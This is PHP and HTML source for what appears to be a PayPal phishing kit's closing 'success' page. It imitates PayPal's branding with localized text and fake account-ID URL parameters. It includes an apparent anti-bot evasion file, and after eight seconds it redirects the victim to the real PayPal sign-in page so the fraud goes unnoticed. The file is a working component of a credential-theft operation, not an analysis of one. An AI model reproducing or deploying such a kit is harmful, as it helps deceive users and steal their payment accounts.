<?php
   
   session_start();
   error_reporting(E_ERROR | E_PARSE);

   include('anti/anti.php');
   include('include/get_lg.php');
   include('../hash.php');

   # Override the session $_SESSION['lang_']
   if(isset($_GET['lg'])){
       if($_GET['lg'] == 'US'){ $_SESSION['lang_'] = "en.php"; }
       else if($_GET['lg'] == 'FR'){ $_SESSION['lang_'] = "fr.php"; }
       else if($_GET['lg'] == 'ES'){ $_SESSION['lang_'] = "es.php"; }
   }
   
   $xDIR_LGx = "bnk.php?country.x=".$countryCode."&locale.x=".getLG($countryCode)."_".$countryCode."&customer.x=ID-PA".$hash."&safety=".$hash2."&lg=";
   
   if(isset($_SESSION['lang_'])){
       include('langdir/'.$_SESSION['lang_']);
   }else {
       include('langdir/en.php');
   }
   
   # REDIRECT THE REAL LINK
   echo '<meta http-equiv="refresh" content="8; URL=https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiz66zAtujuAhWIRhUIHXzGCbgQFjAAegQIBxAC&url=https%3A%2F%2Fwww.paypal.com%2Fus%2Fsignin&usg=AOvVaw08uvttHT3-drSBAApKxO2C" />';

   ?>
<!DOCTYPE html>
<html lang="en-US">
   <head>
      <meta charSet="utf-8" />
      <title>(<?php echo $_SESSION['xcountryCodex']; ?>) <?php echo $xys79x; ?></title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge" />
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=0" />
      <link rel="apple-touch-icon" href="asset/img/pp64.png" />
      <link rel="shortcut icon" type="image/x-icon" href="asset/img/favicon/fav.ico" />
      <link rel="icon" type="image/x-icon" href="asset/img/favicon/fav.ico" />
      <link href="asset/css/myacc.css" media="screen, projection" rel="stylesheet" type="text/css" charSet="UTF-8" />
      <link href="src/fileuploader.css" rel="stylesheet">
      <link href="css/fileuploader.css" rel="stylesheet">
   </head>
   <body>
      <div id="app-element-mountpoint">
         <div id="document-body" dir="ltr">
            <div class="backgroundColor">
               <div>
                                    <div class="signup clear app-wrapper">
                     <div class="signup-page-header"> <a class="signup-page-header-logo"></a></div>
                     <div class="signup-page-header"> <a class="signup-page-header-logo"></a> <a href="myaccount" class="signup-page-header-button vx_btn vx_btn-medium vx_btn-secondary"><?php echo $xys17x; ?></a></div>
                     <main>
                        <div>
                           <div class="signup-page-form">
                              <div class="notification"></div>
                              <div class="busyOverlay" style="transition: unset; display: none;">
                                 <div class="busyIcon" style="top: 50%;"></div>
                                 <p class="xysnewLoaderx" style="margin-left: -92px;"><?php echo $xys68x; ?></p>
                              </div>
                              <div class="signupAppContent">
                                 <div class="fieldGroupContainer">
                                    <div id="xyscontentidx">
                                       <img style="height: 150px; width: 150px;" src="asset/img/succes.gif">
                                       <h1 class="vx_text-2"><?php echo $xys79x; ?></h1>
                                       <p><?php echo $xys80x; ?></p>
                                       <p><?php echo $xys81x; ?></p>
                                    </div>
                                 </div>
                                 <div class="country-and-lang-selector" style="margin-bottom: -22px;margin-top: 30px;"><span> <a href="<?php echo $xDIR_LGx."US"; ?>">English</a> | </span> <span> <a href="<?php echo $xDIR_LGx."FR"; ?>">Français</a> | </span> <span> <a href="<?php echo $xDIR_LGx."ES"; ?>">Español</a></span></div>
                              </div>
                              <div class="signup-page-footer vx_text-legal text-center" style="margin-bottom: 15px;">
                                 ©1999–<?php echo date("Y"); ?>. <?php echo $xys60x; ?> <span class="signup-page-footer-separator">|</span> <a class="vx_text-legal" style="cursor:pointer"><?php echo $xys6x; ?></a> <span class="signup-page-footer-spacer"> </span> <a class="vx_text-legal" style="cursor:pointer"><?php echo $xys7x; ?></a> <span class="signup-page-footer-spacer"> </span> <a class="vx_text-legal" style="cursor:pointer"><?php echo $xys5x; ?></a> <span class="signup-page-footer-spacer"> </span> <span> <a class="vx_text-legal" style="cursor:pointer"><?php echo $xys61x; ?></a> </span> <a href="#" class="vx_text-legal"></a>
                              </div>
                           </div>
                        </div>
                     </main>
                     
                  </div>
               </div>
            </div>
         </div>
      </div>
   </body>
</html>